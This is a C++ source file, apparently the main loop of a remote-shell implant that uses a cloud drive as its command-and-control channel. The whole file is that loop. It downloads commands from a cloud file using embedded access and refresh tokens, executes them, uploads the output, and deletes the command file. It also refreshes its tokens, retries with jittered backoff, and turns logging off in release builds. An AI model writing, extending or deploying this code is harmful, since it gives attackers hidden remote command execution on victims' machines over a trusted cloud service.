#if defined(_DEBUG)
#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_INFO
#else
#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
#endif

#include "cloudfunctions.h"
#include <stack>

static int Odd_Num() {
	int result = rand();
	if (result % 2 == 1)
		return result;
	else
		return result - 1;
}

int main() {

	//Init phase
	std::stack<BYTE> states;
	BYTE lastState = STATE_INIT;
	std::string data, accessToken, refreshToken;
	DWORD lastIndex = 0, lastSubIndex = 0, tries = 0;
	DWORD timeThreshold = 0;
	WORD resCode = BDRIVE_OK;

	states.push(STATE_DOWNLOADING);

	accessToken = INIT_ACCESS_TOKEN;
	refreshToken = INIT_REFRESH_TOKEN;

	SPDLOG_INFO("The for loop is about to start!");

	// This is the main loop of the program
	for (BYTE top = STATE_INIT; true;) {
		top = states.top();

		// This is an if/else switch case to know what to do next
		if (top == STATE_DOWNLOADING)
		{
			SPDLOG_INFO("Shell is in STATE_DOWNLOADING!");

			states.pop();
			resCode = downloadSourceContext(accessToken, data);

			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("Download completed!");

				states.push(STATE_EXECUTING);

				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				SPDLOG_WARN("Access token lost!");

				states.push(STATE_DOWNLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);

				break;
			case BDRIVE_NO_CONTENT:
				SPDLOG_WARN("Source file is empty!");

				states.push(STATE_DOWNLOADING);

				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				SPDLOG_WARN("Connection lost!");

				states.push(STATE_DOWNLOADING);
				states.push(STATE_CONNECTION_LOST);
				break;
			default:
				SPDLOG_WARN("Something unhandled happened!");

				states.push(STATE_DOWNLOADING);
				break;
			}
		}
		else if (top == STATE_EXECUTING)
		{
			SPDLOG_INFO("Shell is in STATE_EXECUTING!");

			states.pop();
			SPDLOG_INFO("Command is: {}", data);
			if (commandExecuter(data, data)) {
				SPDLOG_WARN("Something unhandled happened!");
				states.push(STATE_EXECUTING);
			}
			else
			{
				states.push(STATE_UPLOADING);
				SPDLOG_WARN("Command Execution done!");
			}

		}
		else if (top == STATE_UPLOADING)
		{
			SPDLOG_INFO("Shell is in STATE_UPLOADING!");

			states.pop();
			resCode = uploadResult(data, accessToken, lastIndex, lastSubIndex);

			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("Uploading the result successfully done!");

				lastIndex++;
				lastSubIndex = 0;
				states.push(STATE_DELETING);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				SPDLOG_WARN("Connection lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				SPDLOG_WARN("Access token lost!");

				states.push(STATE_UPLOADING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				SPDLOG_WARN("Something unhandled happened!");

				states.push(STATE_UPLOADING);
				break;
			}
		}
		else if (top == STATE_DELETING)
		{
			SPDLOG_INFO("Shell is in STATE_DELETING!");

			states.pop();
			resCode = deleteSource(accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("Deleting source file successfully done!");

				states.push(STATE_DOWNLOADING);
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
				SPDLOG_WARN("Connection lost!");

				states.push(STATE_DELETING);
				states.push(STATE_CONNECTION_LOST);
				break;
			case BDRIVE_INVALID_ACCESS_TOKEN:
				SPDLOG_WARN("Access token lost!");

				states.push(STATE_DELETING);
				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			default:
				SPDLOG_WARN("Something unhandled happened!");

				states.push(STATE_DELETING);
				break;
			}
		}
		else if (top == STATE_ACCESS_TOKEN_LOST) {
			SPDLOG_INFO("Shell is in STATE_ACCESS_TOKEN_LOST!");

			states.pop();
			resCode = setNewAccessToken(accessToken, refreshToken);
			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("New access token has been set!");

				break;
			case BDRIVE_INVALID_REFRESH_TOKEN:
				SPDLOG_WARN("Refresh token is invalid!");

				states.push(STATE_REFRESH_TOKEN_LOST);
				break;
			case BDRIVE_NO_INTERNET:
			case BDRIVE_TIMED_OUT:
				SPDLOG_WARN("Connection lost!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				states.push(STATE_CONNECTION_LOST);
				break;
			default:
				SPDLOG_WARN("Something unhandled happened!");

				states.push(STATE_ACCESS_TOKEN_LOST);
				break;
			}

		}
		else if (top == STATE_REFRESH_TOKEN_LOST) {
			SPDLOG_INFO("Shell is in STATE_REFRESH_TOKEN_LOST!");

			states.pop();
			resCode = setNewRefreshAndAccessToken(refreshToken, accessToken);

			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("New access & refresh token has been set!");

				break;
			case BDRIVE_NO_CONTENT:
				SPDLOG_WARN("Clipboard is empty!");
				states.push(STATE_REFRESH_TOKEN_LOST);
				break;
			case BDRIVE_TIMED_OUT:
			case BDRIVE_NO_INTERNET:
			default:
				SPDLOG_WARN("Connection lost!");
				states.push(STATE_REFRESH_TOKEN_LOST);
				states.push(STATE_CONNECTION_LOST);
				break;
			}

		}
		// STATE_CONNECTION_LOST
		else 
		{
			SPDLOG_INFO("Shell is in STATE_CONNECTION_LOST!");

			states.pop();
			resCode = checkConnection();
			switch (resCode)
			{
			case BDRIVE_OK:
				SPDLOG_WARN("It's back online!");

				break;
			default:
				SPDLOG_WARN("Connection still lost!");

				states.push(STATE_CONNECTION_LOST);
				break;
			}
		}

		// This is to know how many times we tried this state that we are in
		if (top == lastState && resCode != BDRIVE_OK)
		{
			tries++;
		}
		else {
			lastState = top;
			tries = 0;
			timeThreshold = 0;
		}

		// This is to not exceed the Time threshold
		if (timeThreshold < SLEEP_TIME_THRESHOLD)
		{
			timeThreshold = expo(5, tries);
			SPDLOG_INFO("Time threshold is: {}", timeThreshold);
			Sleep(timeThreshold * 1000 + (rand() % 10) * 100);
		}
		else
		{
			Sleep(SLEEP_TIME_THRESHOLD * 1000);
		}
	}
	return 0;
}